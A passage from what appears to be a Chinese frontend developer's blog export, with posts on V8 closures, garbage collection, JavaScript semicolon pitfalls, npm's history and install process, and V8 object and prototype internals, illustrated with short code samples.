</span>&#123;</span><br><span class="line">  <span class="comment">// 虽然 foo 函数的执行上下文被销毁了</span></span><br><span class="line">  <span class="comment">// 但是依然存活的 inner 函数引用了 foo 函数作用域中的变量 d</span></span><br><span class="line">  <span class="keyword">const</span> d = <span class="number">200</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + d</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> f = foo()</span><br></pre></td></tr></table></figure><p><em>为了实现这一效果：</em><br>此时V8就要对此做特殊处理，负责处理这个任务的模块叫做<strong>预解析器</strong></p><p>V8 引入预解析器，比如当解析顶层代码的时候，遇到了一个函数，那么预解析器并不会直接跳过该函数，而是对该函数做一次快速的预解析，其主要目的有两个</p><ul><li>判断是否存在语法错误</li><li>检查函数内部是否引用了外部变量，如果引用了，就将该变量从栈中赋值到堆中。下次执行该函数时，直接使用堆中的引用，这样，这个外部变量（闭包）就被保留在函数的堆中。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Q: 变量a会被分配到栈上？还是堆上？</span></span><br><span class="line">  <span class="comment">// A: 堆上。预解析器阶段在堆中复制了一个一样的a，调用foo函数使foo出栈栈中的a被销毁，只剩下堆中的a</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> t1 = foo()</span><br><span class="line"><span class="keyword">const</span> t2 = foo()</span><br><span class="line">t1() <span class="comment">// 0 </span></span><br><span class="line">t1() <span class="comment">// 1</span></span><br><span class="line">t2() <span class="comment">// 0</span></span><br></pre></td></tr></table></figure><p>当函数执行完后，函数的执行上下文被销毁，V8又是如何保证闭包不被销毁？这里就涉及到<em>垃圾回收机制</em>。</p><p><br></p><h3 id="4-垃圾回收"><a href="#4-垃圾回收" class="headerlink" title="4. 垃圾回收"></a>4. 垃圾回收</h3><p>垃圾回收的流程大致如下：</p><ol><li>V8从GC Roots对象出发，遍历所有GC Root中的所有对象，遍历到的对象，是可访问的，反之则是不可访问的。在浏览器环境中，GC Root有很多，包含下面几种:<ul><li>全局的window对象（位于每个iframe中）</li><li>文档DOM（原生DOM节点）</li><li>存放在栈上的变量</li></ul></li><li>回收非活动对象所占据的内存</li><li>内存整理</li></ol><p><em>针对长期存在，存活时间很短的两类对象，V8 采用了两个垃圾回收器来回收：主垃圾回收器 和 副垃圾回收器。</em></p><p><br></p><h4 id="4-1-主垃圾回收器-标记-清理"><a href="#4-1-主垃圾回收器-标记-清理" class="headerlink" title="4.1 主垃圾回收器: 标记 + 清理"></a>4.1 主垃圾回收器: 标记 + 清理</h4><p>用来回收不死的、活得更久的对象，如全局的window、DOM、Web API等对象。回收步骤如下：</p><p>由于老生代的对象比较大，若要在老生代中使用 Scavenge 算法进行垃圾回收，复制这些大的对象将会花费比较多的时间，从而导致回收执行效率不高，同时还会浪费一半的空间。所以，主垃圾回收器是采用标记 - 清除（Mark-Sweep）的算法进行垃圾回收的。</p><p>首先是标记过程阶段。标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为活动对象，没有到达的元素就可以判断为垃圾数据。</p><p>接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，主垃圾回收器会直接将标记为垃圾的数据清理掉。<br><br></p><h4 id="4-2-副垃圾回收器：计数-清理"><a href="#4-2-副垃圾回收器：计数-清理" class="headerlink" title="4.2 副垃圾回收器：计数 + 清理"></a>4.2 副垃圾回收器：计数 + 清理</h4><p>用来回收“朝生夕死”的对象。大部分对象在内存中存活的时间很短，比如函数内部声明的变量，或者块级作用域中的变量，当函数或者代码块执行结束时，作用域中定义的变量就会被销毁。因此这一类对象一经分配内存，很快就变得不可访问。</p><p>V8把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域，新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。<em>（内存分配快满时，将存活的对象从对象区域拷贝到空闲区域）</em></p><p>在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段。副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。</p><p><br></p><h3 id="5-结论"><a href="#5-结论" class="headerlink" title="5. 结论"></a>5. 结论</h3><p>有了上面一系列的操作后，当 V8 解析一个函数的时候，判断该函数的内部函数是否引用了当前函数内部声明的变量，如果引用了，那会将该变量存放到堆中，即便当前函数执行结束之后，该变量也不会被释放。</p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>这...这加个分号就不报错了？</title>
      <link href="/2021/07/28/%E5%88%86%E5%8F%B7/"/>
      <url>/2021/07/28/%E5%88%86%E5%8F%B7/</url>
      <content type="html"><![CDATA[<h3 id="1-bug"><a href="#1-bug" class="headerlink" title="1. bug"></a>1. bug</h3><p>碰到一个问题，这段代码会报一个<code>num is not defined</code>的错。但是<code>num</code>命名已经定义了，在控制台一句一句敲是没问题的。后来发现在第3行加个分号就可以了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> i = <span class="number">0</span></span><br><span class="line"><span class="keyword">const</span> j = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[nums[i], nums[j]] = [nums[j], nums[i]]</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 报错信息</span></span><br><span class="line"><span class="comment">Uncaught ReferenceError: nums is not defined</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-不写分号需要注意的情况"><a href="#2-不写分号需要注意的情况" class="headerlink" title="2. 不写分号需要注意的情况"></a>2. 不写分号需要注意的情况</h3><p>由于我们的代码规范是不加分号的，总结一下不加分号需要注意的情况。</p><h4 id="2-1-以括号开头的语句"><a href="#2-1-以括号开头的语句" class="headerlink" title="2.1 以括号开头的语句"></a>2.1 以括号开头的语句</h4><p>这里看似是两个独立执行的函数表达式，其实第三组括号被理解为传参。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;)()<span class="comment">/*这里没有被自动插入分号*/</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 报错信息</span></span><br><span class="line"><span class="comment">(intermediate value)(...) is not a function</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><h4 id="2-2-以数组开头的语句"><a href="#2-2-以数组开头的语句" class="headerlink" title="2.2 以数组开头的语句"></a>2.2 以数组开头的语句</h4><p>被理解为下标运算符和逗号表达式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [[]]<span class="comment">/*这里没有被自动插入分号*/</span></span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>].forEach(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e))</span><br></pre></td></tr></table></figure></p><h4 id="2-3-以正则表达式开头的语句"><a href="#2-3-以正则表达式开头的语句" class="headerlink" title="2.3 以正则表达式开头的语句"></a>2.3 以正则表达式开头的语句</h4><p>正则的第一个斜杠被理解为除号，后面的意思就变了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>, g = &#123;<span class="attr">test</span>:<span class="function"><span class="params">()</span>=&gt;</span><span class="number">0</span>&#125;, b = <span class="number">1</span><span class="comment">/*这里没有被自动插入分号*/</span></span><br><span class="line">/(a)/g.test(<span class="string">"abc"</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">RegExp</span>.$<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h4 id="2-4-以Template开头的语句"><a href="#2-4-以Template开头的语句" class="headerlink" title="2.4 以Template开头的语句"></a>2.4 以Template开头的语句</h4><p>因为没有自动插入分号，函数 f 被认为跟 Template 一体的，进而被莫名其妙地执行了一次。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> g = f<span class="comment">/*这里没有被自动插入分号*/</span></span><br><span class="line"><span class="string">`Template`</span>.match(<span class="regexp">/(a)/</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">RegExp</span>.$<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://time.geekbang.org/column/article/87179" target="_blank" rel="noopener">JavaScript语法（预备篇）：到底要不要写分号呢？</a></li></ul>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>动画</title>
      <link href="/2021/07/28/%E5%8A%A8%E7%94%BB/"/>
      <url>/2021/07/28/%E5%8A%A8%E7%94%BB/</url>
      <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>npm包发展史</title>
      <link href="/2021/07/15/npm%E5%8C%85%E5%8F%91%E5%B1%95%E5%8F%B2/"/>
      <url>/2021/07/15/npm%E5%8C%85%E5%8F%91%E5%B1%95%E5%8F%B2/</url>
      <content type="html"><![CDATA[<blockquote><p>JS原来只运行在浏览器中。Node.js和npm的诞生，让js可以操作文件，网络传输，使得前端拥有了工程化的可能，大大减少了重复性工作（包资源管理、热更新机制、webpack打包）。</p></blockquote><p><br></p><h3 id="1-在没有包管理器前"><a href="#1-在没有包管理器前" class="headerlink" title="1. 在没有包管理器前"></a>1. 在没有包管理器前</h3><p>正确来说 Node.js 是不存在没有包管理器的时期的。2009 年 Node.js 问世的时候 NPM 的雏形也发布了。<br>而在2009年之前，那时候做得最多的事情是：在网上找包，如 jQuery。找到下载地址，下载 放到项目中一个叫 libs 的目录，或者直接将 CDN 链接粘贴到 HTML 中。</p><p><br></p><h3 id="2-npm-v1-v2"><a href="#2-npm-v1-v2" class="headerlink" title="2. npm v1-v2"></a>2. npm v1-v2</h3><p>2009 年，Node.js 诞生，npm（Node.js Package Manager）的雏形也正在酝酿。<br>​2011 年，npm 发布了 1.0 版本。<br>这一版npm带来的node_modules文件结构，是嵌套结构。<br>此时，node_modules的嵌套深度十分可怕，堪比黑洞。只有当所有子叶都不再依赖第三方包时，这棵树才能走到尽头。<br>一个库，被不同的包依赖了，那么它就会被安装两次，这种嵌套结构很快就能把磁盘占满。相信早期npm的windows用户都见过这个弹窗：</p><p>（node_modules文件夹无法删除，因为超过了windows能处理的最大路径）</p><p><br></p><h3 id="3-yarn-amp-npm-v3"><a href="#3-yarn-amp-npm-v3" class="headerlink" title="3. yarn &amp; npm v3"></a>3. yarn &amp; npm v3</h3><p>2016年，yarn诞生了。yarn解决了npm几个最为迫在眉睫的问题：</p><ul><li>安装太慢 -&gt; 加缓存，多线程</li><li>嵌套结构 -&gt; 扁平化</li><li>无依赖锁 -&gt; yarn.lock</li></ul><p>yarn最大的贡献是发明了<em>yarn.lock依赖锁</em>。这一扁平化结构，使得实际需要安装的包数量大大减少，再加上首发的缓存机制，使得依赖安装的速度大幅提升。而npm在一年后的v5才跟上了步伐，发布了package-lock.json。在没有依赖锁的年代，即使没有改变一行代码，一次<code>npm install</code>带来的实际代码量变更很可能是巨大的。</p><p><br></p><h3 id="4-输入npm-install会发生什么？"><a href="#4-输入npm-install会发生什么？" class="headerlink" title="4. 输入npm install会发生什么？"></a>4. 输入<em><code>npm install</code></em>会发生什么？</h3><ol><li>执行工程自身<em><code>preinstall</code></em>钩子</li><li>确定首层依赖<br>找到<em><code>dependencies</code></em> 和 <em><code>devDependencies</code></em> 属性中直接指定的模块。开启多进程从每个首层依赖模块开始逐步寻找更深层级的节点。</li><li><p>获取模块</p><ul><li>【确定包版本】 如果<em><code>npm-shrinkwrap.json</code></em>或<em><code>package-lock.json</code></em>中有该模块信息直接拿，如果没有则从<em><code>package.json</code></em>中获取。<strong>某个包的版本是 ^1.1.0，npm 就会去仓库中获取符合 1.x.x 形式的最新版本。</strong></li><li>【获取包】查询<em><code>node_modules</code></em>目录中是否已经存在指定模块<ul><li>若存在，不再重新安装</li><li>若不存在<ul><li>npm向registry查询模块压缩包的网址</li><li>下载压缩包，存放在根目录下的<em><code>.npm</code></em>目录里</li><li>解压压缩包到当前项目的<em><code>node_modules</code></em>目录</li></ul></li></ul></li><li>【查找该模块依赖】如果有依赖则回到第1步，如果没有则停止。</li></ul></li><li><p>模块扁平化<br>一个项目里面可能会包含大量重复模块。A模块依赖于lodash，B模块也依赖于lodash。从 npm3 开始默认加入了一个 dedupe 的过程。它会遍历所有节点，逐个将模块放在根节点下面，也就是 node-modules 的第一层。当发现有重复模块时，则将其丢弃。</p></li></ol><p><br></p><h3 id="5-版本号约定"><a href="#5-版本号约定" class="headerlink" title="5. 版本号约定"></a>5. 版本号约定</h3><p>因为npm采用了语义化版本约定，简单来说，a.b.c代表着</p><ul><li>a 主版本号：当你做了不兼容的 API 修改</li><li>b 次版本号：当你做了向下兼容的功能性新增</li><li>c 修订号：当你做了向下兼容的问题修正</li></ul><p><em>Q：A模块依赖于lodash1.0.0，B模块也依赖于lodash2.0.0，最后安装的lodash会是哪个版本？</em><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设我们的依赖树如下</span></span><br><span class="line">node_modules</span><br><span class="line">- foo</span><br><span class="line">-- lodash@version1</span><br><span class="line">- bar</span><br><span class="line">-- lodash@version2</span><br></pre></td></tr></table></figure></p><p>foo 模块依赖 lodash@^1.0.0<br>bar 模块依赖 lodash@^1.1.0<br>则 ^1.1.0 为兼容版本。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存在兼容版本</span></span><br><span class="line">- foo</span><br><span class="line">- bar</span><br><span class="line">- lodash <span class="comment">// 保留版本为兼容版本</span></span><br></pre></td></tr></table></figure></p><p>foo 依赖 lodash@^2.0.0<br>bar 依赖 lodash@^1.1.0<br>二者不存在兼容版本。会将一个版本放在 node_modules 中，另一个仍保留在依赖树里。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不存在兼容版本</span></span><br><span class="line">node_modules</span><br><span class="line">- foo</span><br><span class="line">- lodash@version1</span><br><span class="line">- bar</span><br><span class="line">-- lodash@version2</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/22" target="_blank" rel="noopener">介绍下 npm 模块安装机制，为什么输入 npm install 就可以自动安装对应的模块？</a></li><li><a href="https://github.com/SamHwang1990/blog/issues/7#issue-207283826" target="_blank" rel="noopener">浅谈npm 的依赖与版本</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>V8引擎</title>
      <link href="/2021/07/15/V8%E5%BC%95%E6%93%8E/"/>
      <url>/2021/07/15/V8%E5%BC%95%E6%93%8E/</url>
      <content type="html"><![CDATA[<h3 id="1-函数即对象"><a href="#1-函数即对象" class="headerlink" title="1. 函数即对象"></a>1. 函数即对象</h3><p>我们先来看一段代码，这里我们定义了一个函数<code>foo</code>，接着又给<code>foo</code>函数设置了<code>myName</code>属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'foo'</span>)</span><br><span class="line">&#125;</span><br><span class="line">foo.myName = <span class="number">1</span></span><br><span class="line">foo.obj = &#123; <span class="attr">x</span>: <span class="number">1</span> &#125;</span><br><span class="line">foo.fun = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo.myName) <span class="comment">// 1</span></span><br><span class="line">foo() <span class="comment">// foo</span></span><br></pre></td></tr></table></figure></p><p>我们既可以给<code>foo</code>添加属性，有可以实现调用<code>foo</code>。因为在V8内部，会为函数对象添加两个隐藏属性<code>name</code>和<code>code</code>，code的值是函数代码，当执行函数调用语句时，V8会从函数对象中取出<code>code</code>属性值，然后执行这段函数。</p><p><img src="/2021/07/15/V8引擎/2.jpg"></p><p>因为函数是一种特殊的对象，所以在 JavaScript 中，函数可以赋值给一个变量，也可以作为函数的参数，还可以作为函数的返回值。</p><h3 id="2-快属性和慢属性"><a href="#2-快属性和慢属性" class="headerlink" title="2. 快属性和慢属性"></a>2. 快属性和慢属性</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">100</span>] = <span class="string">'test-100'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="string">'test-1'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"B"</span>] = <span class="string">'bar-B'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">50</span>] = <span class="string">'test-50'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">9</span>] =  <span class="string">'test-9'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">8</span>] = <span class="string">'test-8'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="string">'test-3'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">5</span>] = <span class="string">'test-5'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"A"</span>] = <span class="string">'bar-A'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"C"</span>] = <span class="string">'bar-C'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> Foo()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(key <span class="keyword">in</span> bar)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`index:<span class="subst">$&#123;key&#125;</span>  value:<span class="subst">$&#123;bar[key]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 打印结果: 数字属性被最先打印出来，且是按照数字大小的顺序打印；字符串属性是按照设置顺序打印的。</span></span><br><span class="line"><span class="comment">index:1  value:test-1</span></span><br><span class="line"><span class="comment">index:3  value:test-3</span></span><br><span class="line"><span class="comment">index:5  value:test-5</span></span><br><span class="line"><span class="comment">index:8  value:test-8</span></span><br><span class="line"><span class="comment">index:9  value:test-9</span></span><br><span class="line"><span class="comment">index:50  value:test-50</span></span><br><span class="line"><span class="comment">index:100  value:test-100</span></span><br><span class="line"><span class="comment">index:B  value:bar-B</span></span><br><span class="line"><span class="comment">index:A  value:bar-A</span></span><br><span class="line"><span class="comment">index:C  value:bar-C</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>之所以出现这样的结果，是因为在 ECMAScript 规范中定义了<strong>数字属性</strong>应该按照索引值大小升序排列，<strong>字符串属性</strong>根据创建时的顺序升序排列。</p><p>在 V8 内部，为了有效地提升存储和访问这两种属性的性能，分别使用了两个线性数据结构来分别保存<strong>数字属性 element</strong>和<strong>字符串属性 properties</strong>。</p><p><a href="https://www.cnblogs.com/chargeworld/p/12236848.html" target="_blank" rel="noopener">https://www.cnblogs.com/chargeworld/p/12236848.html</a></p><h3 id="3-函数声明-和-函数表达式"><a href="#3-函数声明-和-函数表达式" class="headerlink" title="3. 函数声明 和 函数表达式"></a>3. 函数声明 和 函数表达式</h3><ul><li><strong>函数声明</strong>的本质是语句，而<strong>函数表达式</strong>的本质则是表达式。</li><li><p>在编译阶段，碰到变量，V8会将变量提升到作用域中时，还会为其设置默认值 undefined。如果是函数声明，则会在内存中创建该函数对象，并提升整个函数对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(x)   <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">// 完整的对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>函数立即表示式可以用来封装一些变量，函数，起到隔离和代码隐藏的作用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    n = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(n);</span><br><span class="line">&#125;())</span><br><span class="line"><span class="built_in">console</span>.log(n);</span><br><span class="line"><span class="comment">// 100</span></span><br><span class="line"><span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    n = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(n);</span><br><span class="line">foo()</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 100</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-原型链"><a href="#4-原型链" class="headerlink" title="4. 原型链"></a>4. 原型链</h3><p>继承就是一个对象可以访问另外一个对象中的属性和方法。</p><p>JavaScript 的每个对象都包含了一个隐藏属性 <code>__proto__</code> ，我们就把该隐藏属性 <code>__proto__</code> 称之为该对象的原型 (prototype), <code>__proto__</code> 指向了内存中的另外一个对象，我们就把 <code>__proto__</code> 指向的对象称为该对象的原型对象，那么该对象就可以直接访问其原型对象的方法或者属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DogFactory</span>(<span class="params">type,color</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.type = type</span><br><span class="line">  <span class="keyword">this</span>.color = color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> DogFactory(<span class="string">'Dog'</span>,<span class="string">'Black'</span>)</span><br></pre></td></tr></table></figure><p>当V8执行上面的代码时，其实悄悄做了以下几件事情<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dog = &#123;&#125;</span><br><span class="line">dog.__proto__ = DogFactory.prototype</span><br><span class="line">DogFactory.call(dog, <span class="string">'Dog'</span>, <span class="string">'Black'</span>)</span><br></pre></td></tr></table></figure></p><p>每个函数对象中都有一个公开的<code>prototype</code>属性，当你讲这个函数作为构造函数来创建新对象时，新创建对象的原型对象就指向了该函数的<code>prototype</code>属性。</p><p><a href="https://juejin.im/post/5cc99fdfe51d453b440236c3" target="_blank" rel="noopener">https://juejin.im/post/5cc99fdfe51d453b440236c3</a></p><h3 id="5-作用域链"><a href="#5-作用域链" class="headerlink" title="5. 作用域链"></a>5. 作用域链</h3><p>作用域就是存放变量和函数的地方。作用域链就是将一个个作用域串起来，实现变量查找的路径。</p><p>全局作用域是在 V8 启动过程中就创建了，且一直保存在内存中不会被销毁的，直至 V8 退出。 而函数作用域是在执行该函数时创建的，当函数执行结束之后，函数作用域就随之被销毁掉了。</p><h3 id="6-运行时环境"><a href="#6-运行时环境" class="headerlink" title="6. 运行时环境"></a>6. 运行时环境</h3><ul><li>栈空间：用来管理 JavaScript 函数调用的</li></ul><h3 id="7-函数调用时如何影响内存布局的？"><a href="#7-函数调用时如何影响内存布局的？" class="headerlink" title="7. 函数调用时如何影响内存布局的？"></a>7. 函数调用时如何影响内存布局的？</h3><p>函数在执行过程中，其内部的临时变量会按照执行顺序被压入到栈中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 在同一任务中重复调用嵌套的foo函数，发生栈溢出</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  foo()</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用setTimeout让foo函数在不同的任务中执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(foo, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span 